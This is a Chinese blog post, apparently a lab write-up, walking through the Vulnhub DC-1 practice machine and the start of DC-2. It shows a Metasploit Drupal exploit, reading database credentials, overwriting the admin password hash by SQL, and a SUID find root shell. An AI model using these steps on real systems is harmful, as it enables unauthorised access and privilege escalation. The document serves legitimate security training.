@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="渗透,Vulnhub"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="vulnhub_DC通关 | Mei的小窝"/><meta name="apple-mobile-web-app-title" content="vulnhub_DC通关 | Mei的小窝"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2026/03/29/vulnhub-DC通关/"/><meta name="description" content="vulnhub_DC通关DC-1我们下载好ova镜像之后导入VM虚拟机，然后使用NAT&#x2F;桥接模式。我们再打开kali，使用sudo arp-scan -l 命令来判断本地存活的主机   发现我们靶场的ip，直接访问。发现是一个登录界面，查看信息发现是一个cms框架   直接尝试去查询历史漏洞，网上复现还是挺难的，直接去msf中尝试找现成的先通过msfconsole启动Metaspl...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub_DC通关 | Mei的小窝">
+<meta property="og:url" content="http://example.com/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/index.html">
+<meta property="og:site_name" content="Mei的小窝">
+<meta property="og:description" content="vulnhub_DC通关DC-1我们下载好ova镜像之后导入VM虚拟机，然后使用NAT&#x2F;桥接模式。我们再打开kali，使用sudo arp-scan -l 命令来判断本地存活的主机   发现我们靶场的ip，直接访问。发现是一个登录界面，查看信息发现是一个cms框架   直接尝试去查询历史漏洞，网上复现还是挺难的，直接去msf中尝试找现成的先通过msfconsole启动Metaspl...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/assets/images/Hexo-Theme-MEOW.png">
+<meta property="article:published_time" content="2026-03-29T07:34:36.000Z">
+<meta property="article:modified_time" content="2026-04-01T03:32:39.336Z">
+<meta property="article:author" content="Regulus">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>vulnhub_DC通关 | Mei的小窝</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>Mei的小窝</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">Mei的小窝</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 Mei的小窝 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">vulnhub_DC通关</h1><div class="post-author"><span>作者: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-03-29</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-04-01</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>总字数: 2.4k字</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>阅读时长: 8分钟</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>访问量: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-categories-link" href="/categories/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a></span></div><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="post-tags-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></span></div></div></div><div class="post markdown" indent="false"><h1 id="vulnhub-DC通关"><a href="#vulnhub-DC通关" class="headerlink" title="vulnhub_DC通关"></a>vulnhub_DC通关</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><p>我们下载好ova镜像之后导入VM虚拟机，然后使用NAT&#x2F;桥接模式。我们再打开kali，使用<code>sudo arp-scan -l </code>命令来判断本地存活的主机</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330155526614.png" class title="image-20260330155526614">
+
+<p>发现我们靶场的ip，直接访问。发现是一个登录界面，查看信息发现是一个cms框架</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330155702422.png" class title="image-20260330155702422">
+
+<p>直接尝试去查询历史漏洞，网上复现还是挺难的，直接去msf中尝试找现成的先通过<code>msfconsole</code>启动Metasploit然后</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal <span class="comment">#查询Drupal相关的模块</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>发现存在exploit</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330160229475.png" class title="image-20260330160229475">
+
+<p>先看看前面两个是否可以使用，第一个需要有coder模块该靶机无法使用。第二个则是Drupal的核心漏洞不需要第三方模块</p>
+<p>通过info查看exploti的详细信息</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330161712524.png" class title="image-20260330161712524">
+
+<p>拿到的权限是web权限</p>
+<p>然后show options攻击需要的参数</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330161831148.png" class title="image-20260330161831148">
+
+<p>正常请况下只需要提供目标靶机的ip</p>
+<p><code>set rhosts 192.168.164.130</code>设置好攻击ip然后直接<code>run</code>进行攻击</p>
+<p>成功利用漏洞然后shell打开命令行，通过python调用bash<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330162350872.png" class title="image-20260330162350872">
+
+<p>在web目录发现flag1，直接cat</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330162546187.png" class title="image-20260330162546187">
+
+<p>提示我们需要去找Drupal的配置文件，虽然可以直接到网上找配置文件的路径和名称，但是线下可不会让我联网，我印象的配置文件一般为<code>settings.php config.php</code>等，于是直接使用find命令在web根目录直接查找文件名</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&#x27;*set*&#x27;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>发现settings.php</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330163417696.png" class title="image-20260330163417696">
+
+<p>直接cat得到flag2</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330163609970.png" class title="image-20260330163609970">
+
+<p>提示我们<code>What can you do with these credentials</code>，你可以使用这些信息去做什么</p>
+<p>下面的那个数组是该网站数据库的名称和账号密码以及可以看到使用的数据库是mysql，我们可以尝试连接数据库。</p>
+<p>连接数据库我们直接登录数据库</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>登录之后直接查user表的数据</p>
+<div class="code-container" code-lang="Sql"><div class="codebox"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users\G;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>发现admin账号然后密码是hash值</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330192849359.png" class title="image-20260330192849359">
+
+<p>虽然我可以直接尝试hashcat爆破，但是又发现flag2那里有提示</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line">* only ways to gain access (and you WILL need access).</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>暴力破解和字典攻击不是获得访问权限的唯一方式（而且你<strong>确实</strong>需要获得访问权限）。</p>
+<p>于是肯定不是让我们用hashcat去爆破。</p>
+<p>既然有注册功能，然后又提示我们不能使用hashcat去爆破，那也就不是普通的哈希，我们尝试在web目录下寻找和hash有关的文件。</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&quot;*hash*&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>发现一个bash脚本</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330193621317.png" class title="image-20260330193621317">
+
+<p>运行发现这是一个hash密码生成器，我们直接将1234生成hash</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh <span class="string">&quot;1234&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>拿到hash值</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ./scripts/password-hash.sh <span class="string">&quot;1234&quot;</span></span><br><span class="line">./scripts/password-hash.sh <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line">password: 1234          <span class="built_in">hash</span>: $S<span class="variable">$DiOfEvZgqGeN</span>.G/s.elcqj6wpcPs2LLOE9js7IofFdHDUwzVkCrY</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>然后我们只需要执行sql语句将我们生成已知hash值去替换掉admin的密码就可以登录admin账号了</p>
+<div class="code-container" code-lang="Sql"><div class="codebox"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DiOfEvZgqGeN.G/s.elcqj6wpcPs2LLOE9js7IofFdHDUwzVkCrY&#x27;</span> <span class="keyword">WHERE</span> uid<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>然后直接admin 1234登录上，然后在Dashboard上发现了一篇名字为flag3的博客拿到flag3</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330195323149.png" class title="image-20260330195323149">
+
+<p>提示我们<code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code><strong>“特殊的权限将帮助你 FIND 密码文件 - 但你需要 -exec 那个命令来弄清楚如何获取 shadow 文件中的内容。”</strong></p>
+<p>也就是我们需要去读取shadow文件的内容，但是我们权限不够需要去提权。然后我们先去查看密码文件<code>/etc/passwd</code></p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330200043226.png" class title="image-20260330200043226">
+
+<p>发现flag4的线索，直接去flag4用户的目录下查找发现flag4.txt</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260330200204012.png" class title="image-20260330200204012">
+
+<p>提示我们需要去root用户的目录下去查找flag5，但是我们没有root权限。</p>
+<p>我们直接使用find进行提权</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先判断find是否有suid</span></span><br><span class="line"><span class="built_in">ls</span> -l  /usr/bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</span><br><span class="line"><span class="comment"># 然后再判断find是否有root权限</span></span><br><span class="line">find `<span class="built_in">which</span> find` -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line">root</span><br><span class="line"><span class="comment">#使用find开启bash</span></span><br><span class="line">find / -<span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span> -p \;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>启动bash之后我们的bash进程就是以root权限开启的</p>
+<p>我们再直接查看root用户目录下的文件<code>ls /root</code>，发现最后的flag</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260331155832375.png" class title="image-20260331155832375">
+
+
+
+<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><p>按照DC-1的方法访问靶场的时候会跳转到<code>http://DC-2</code>，这个域名肯定是不存在的，于是我们需要将ip和这个域名绑定起来<code>192.168.164.131</code>，之前使用phpstudy帮的域名都是本地的，我们需要去修改<code>C:\Windows\System32\drivers\etc\hosts</code>文件，在末尾添加上<code>192.168.164.131 DC-2</code></p>
+<p>然后我们再去访问<code>DC-2</code>域名我们就可以跳转的正常界面，直接就可以看到flag1</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260331173340982.png" class title="image-20260331173340982">
+
+<p>提示我们</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>说我们平时的字典可能不够用，我需要使用cewl这个工具，我登录进去之后就肯拿到下一个flag.</p>
+<p>cewl实际上是一个爬虫工具，可以对一个网站进行去，既可以输出网站的详细信息，也可以通过爬取到的信息去生成一个可用于弱口令爆破密码的字典。然后由于cewl是根据爬取到的信息经过Hashcat规则变形生成的密码，实际上只有在用户名和密码和网站的信息有关的时候才有用。</p>
